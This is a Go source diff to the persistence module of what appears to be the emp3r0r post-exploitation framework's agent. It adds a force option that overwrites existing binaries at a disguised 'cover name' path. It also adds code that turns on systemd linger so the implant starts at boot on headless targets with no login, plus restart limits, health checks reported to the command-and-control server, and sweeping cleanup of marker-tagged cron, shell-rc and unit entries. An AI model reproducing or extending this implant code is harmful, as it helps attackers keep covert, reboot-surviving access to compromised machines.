@@ -20,9 +20,11 @@ package handler
 import (
 	"fmt"
 	"os"
+	"os/user"
 	"path/filepath"
 	"runtime"
 	"strings"
+	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
@@ -82,7 +84,13 @@ func dropPersistCopy() (string, error) {
 	// own image (a previous persist of this very identity).
 	if existing, err := os.ReadFile(binPath); err == nil {
 		if string(existing) != string(self) {
-			return "", fmt.Errorf("%s already exists and is not our image — refusing to overwrite a real tool; pick another identity", binPath)
+			if !forceDrop {
+				return "", fmt.Errorf("%s already exists and is not our image — refusing to overwrite a real tool; use --force to override", binPath)
+			}
+			logging.Debugf("persist: --force: overwriting %s", binPath)
+		} else {
+			// already our image — idempotent skip (avoid I/O + timestamp churn)
+			return binPath, nil
 		}
 	}
 	if err := os.WriteFile(binPath, self, 0o755); err != nil {
@@ -131,6 +139,37 @@ func systemctlUserEnv() []string {
 	return env
 }
 
+// enableLinger turns on systemd --user at boot for the current user.
+// Without linger the user manager (and every user unit) only starts after
+// an interactive login — which never happens on headless targets, making
+// the systemd mechanism a no-op exactly where it matters most. Idempotent.
+func enableLinger() (bool, error) {
+	u, err := user.Current()
+	if err != nil {
+		return false, err
+	}
+	if _, err := os.Stat("/var/lib/systemd/linger/" + u.Username); err == nil {
+		return true, nil // already lingering
+	}
+	if _, err := util.RunCmdOutput("loginctl", "enable-linger", u.Username); err != nil {
+		return false, err
+	}
+	_, err = os.Stat("/var/lib/systemd/linger/" + u.Username)
+	return err == nil, err
+}
+
+// lingerState renders the boot-behavior caveat for install/status output.
+func lingerState() string {
+	u, err := user.Current()
+	if err != nil {
+		return "linger=unknown"
+	}
+	if _, err := os.Stat("/var/lib/systemd/linger/" + u.Username); err == nil {
+		return "linger=on (autostart at boot, no login needed)"
+	}
+	return "linger=off (fires after first login only)"
+}
+
 // systemctlUser runs `systemctl --user ...` with the standard user-session
 // environment injected.
 func systemctlUser(args ...string) (string, error) {
@@ -161,6 +200,8 @@ After=network-online.target
 ExecStart=%s %s
 Restart=on-failure
 RestartSec=%d
+StartLimitBurst=5
+StartLimitIntervalSec=600
 
 [Install]
 WantedBy=default.target
@@ -186,12 +227,44 @@ WantedBy=default.target
 		cleanup()
 		return "", fmt.Errorf("enable: %v: %s", err, strings.TrimSpace(out))
 	}
+	// headless survival: linger must be on for the unit to fire at boot
+	lingerOn, lingerErr := enableLinger()
 	// --now may fail if the session bus is unreachable from this shell; the
 	// unit still autostarts at login/boot, so only warn
 	if out, err := systemctlUser("start", name+".service"); err != nil {
 		logging.Debugf("systemctl --user start: %v: %s", err, strings.TrimSpace(out))
 	}
-	return fmt.Sprintf("systemd user unit %s (enabled, autostart at boot/login)", unitPath), nil
+	// health check: wait briefly for the unit to reach a real state
+	healthOk, healthState := false, "unknown"
+	for i := 0; i < 3; i++ {
+		out, err := systemctlUser("is-active", name+".service")
+		state := strings.TrimSpace(out)
+		if err == nil && state == "active" {
+			healthOk, healthState = true, state
+			break
+		}
+		if state == "failed" || state == "inactive" {
+			healthState = state
+			break
+		}
+		healthState = state
+		time.Sleep(2 * time.Second)
+	}
+	lingerText := "linger=off (WARNING: fires after first login only — headless boot will NOT start it)"
+	if lingerOn {
+		lingerText = "linger=on (autostart at boot, no login needed)"
+	} else if lingerErr != nil {
+		lingerText = "linger=FAILED (" + lingerErr.Error() + ") — fires after first login only"
+	}
+	healthText := "health=not-running"
+	if healthOk {
+		healthText = "health=running"
+	} else if healthState == "failed" {
+		healthText = "health=failed (ExecStart returned error)"
+	} else if healthState == "activating" || healthState == "reloading" {
+		healthText = "health=" + healthState + " (waiting for start)"
+	}
+	return fmt.Sprintf("systemd user unit %s enabled; %s; %s", unitPath, lingerText, healthText), nil
 }
 
 func persistSystemdStatus(binPath string) (bool, string) {
@@ -200,15 +273,42 @@ func persistSystemdStatus(binPath string) (bool, string) {
 	if err != nil || !util.IsExist(unitPath) {
 		return false, ""
 	}
-	return true, unitPath
+	return true, unitPath + " — " + lingerState()
 }
 
 func persistSystemdRemove(binPath string) error {
-	name := filepath.Base(binPath)
-	_, _ = util.RunCmdOutput("systemctl", "--user", "disable", "--now", name+".service")
-	unitPath, err := persistSystemdUnitPath(name)
-	if err == nil {
-		_ = os.Remove(unitPath)
+	// remove the specific unit if binPath is known
+	if binPath != "" {
+		name := filepath.Base(binPath)
+		_, _ = util.RunCmdOutput("systemctl", "--user", "disable", "--now", name+".service")
+		unitPath, err := persistSystemdUnitPath(name)
+		if err == nil {
+			_ = os.Remove(unitPath)
+		}
+	}
+	// also scan for any orphaned units with our marker
+	home, herr := persistHome()
+	if herr == nil {
+		udir := filepath.Join(home, ".config", "systemd", "user")
+		entries, _ := os.ReadDir(udir)
+		for _, e := range entries {
+			if !strings.HasSuffix(e.Name(), ".service") {
+				continue
+			}
+			full := filepath.Join(udir, e.Name())
+			data, err := os.ReadFile(full)
+			if err != nil {
+				continue
+			}
+			if strings.Contains(string(data), persistMarker) {
+				staleName := strings.TrimSuffix(e.Name(), ".service")
+				_, _ = util.RunCmdOutput("systemctl", "--user", "disable", "--now", e.Name())
+				os.Remove(full)
+				if staleName != filepath.Base(binPath) {
+					logging.Debugf("persist: removed orphaned unit %s", e.Name())
+				}
+			}
+		}
 	}
 	_, _ = util.RunCmdOutput("systemctl", "--user", "daemon-reload")
 	return nil
@@ -275,7 +375,9 @@ func persistCronRemove(binPath string) error {
 	}
 	var kept []string
 	for _, l := range strings.Split(out, "\n") {
-		if strings.Contains(l, binPath+" ") {
+		// remove any line with our marker (handles orphaned entries from
+		// previous cover names, not just the current binPath)
+		if strings.Contains(l, persistMarker) {
 			continue
 		}
 		kept = append(kept, l)
@@ -365,7 +467,8 @@ func persistShellrcRemove(binPath string) error {
 		var kept []string
 		changed := false
 		for _, l := range strings.Split(string(b), "\n") {
-			if strings.Contains(l, binPath+" ") {
+			// remove any line with our marker (handles orphaned entries)
+			if strings.Contains(l, persistMarker) {
 				changed = true
 				continue
 			}
@@ -413,6 +516,9 @@ func runPersist(cmd *cobra.Command, args []string) {
 		action = args[0]
 	}
 	method, _ := cmd.Flags().GetString("method")
+	allMechs, _ := cmd.Flags().GetBool("all")
+	force, _ := cmd.Flags().GetBool("force")
+	forceDrop = force
 
 	switch action {
 	case "install":
@@ -437,8 +543,11 @@ func runPersist(cmd *cobra.Command, args []string) {
 			}
 		}
 		for _, m := range tryOrder {
-			if ok, _ := m.Status(binPath); ok {
+			if ok, _ := m.Status(binPath); ok && !allMechs {
 				installed = append(installed, fmt.Sprintf("%s: already installed", m.Name))
+				if method == "" || method == "auto" {
+					break // auto mode: already present counts as success
+				}
 				continue
 			}
 			res, err := m.Install(binPath, argv)
@@ -447,7 +556,7 @@ func runPersist(cmd *cobra.Command, args []string) {
 				continue
 			}
 			installed = append(installed, fmt.Sprintf("%s: %s", m.Name, res))
-			if method == "" || method == "auto" {
+			if (method == "" || method == "auto") && !allMechs {
 				break // auto mode: first success wins
 			}
 		}
@@ -459,22 +568,38 @@ func runPersist(cmd *cobra.Command, args []string) {
 
 	case "remove":
 		binPath := persistBinPath()
-		if binPath == "" {
-			c2transport.NotifyC2(cmd, "No persistence copy found")
-			return
-		}
 		var removed []string
+		// clean ALL marked entries across all mechanisms (handles orphaned
+		// entries from previous cover names)
 		for _, m := range persistMechanisms {
-			if ok, _ := m.Status(binPath); ok {
-				if err := m.Remove(binPath); err != nil {
-					removed = append(removed, fmt.Sprintf("%s: remove failed: %v", m.Name, err))
-					continue
+			if err := m.Remove(binPath); err != nil {
+				removed = append(removed, fmt.Sprintf("%s: remove failed: %v", m.Name, err))
+				continue
+			}
+			removed = append(removed, m.Name)
+		}
+		// always remove the binary if it exists
+		if binPath != "" {
+			if err := os.Remove(binPath); err == nil {
+				removed = append(removed, fmt.Sprintf("binary %s", binPath))
+			}
+		} else {
+			// no current binPath — try to find and clean any stale copy
+			if home, err := persistHome(); err == nil {
+				binDir := filepath.Join(home, ".local", "bin")
+				entries, _ := os.ReadDir(binDir)
+				for _, e := range entries {
+					p := filepath.Join(binDir, e.Name())
+					if data, err := os.ReadFile(p); err == nil && strings.Contains(string(data), persistMarker) {
+						os.Remove(p)
+						removed = append(removed, fmt.Sprintf("stale binary %s", p))
+					}
 				}
-				removed = append(removed, m.Name)
 			}
 		}
-		if err := os.Remove(binPath); err == nil {
-			removed = append(removed, fmt.Sprintf("binary %s", binPath))
+		if len(removed) == 0 {
+			c2transport.NotifyC2(cmd, "No persistence found")
+			return
 		}
 		c2transport.NotifyC2(cmd, "Removed: %s", strings.Join(removed, ", "))
 
@@ -502,6 +627,9 @@ var readSelfImage = func() ([]byte, error) {
 // dropPersistName overrides the cover name for the persist copy (tests);
 // empty = the live masquerade identity.
 var dropPersistName string
+
+// forceDrop bypasses the collision guard (--force flag).
+var forceDrop bool
 
 // dropPersistCopyNamed runs dropPersistCopy under an explicit cover name.
 func dropPersistCopyNamed(name string) (string, error) {
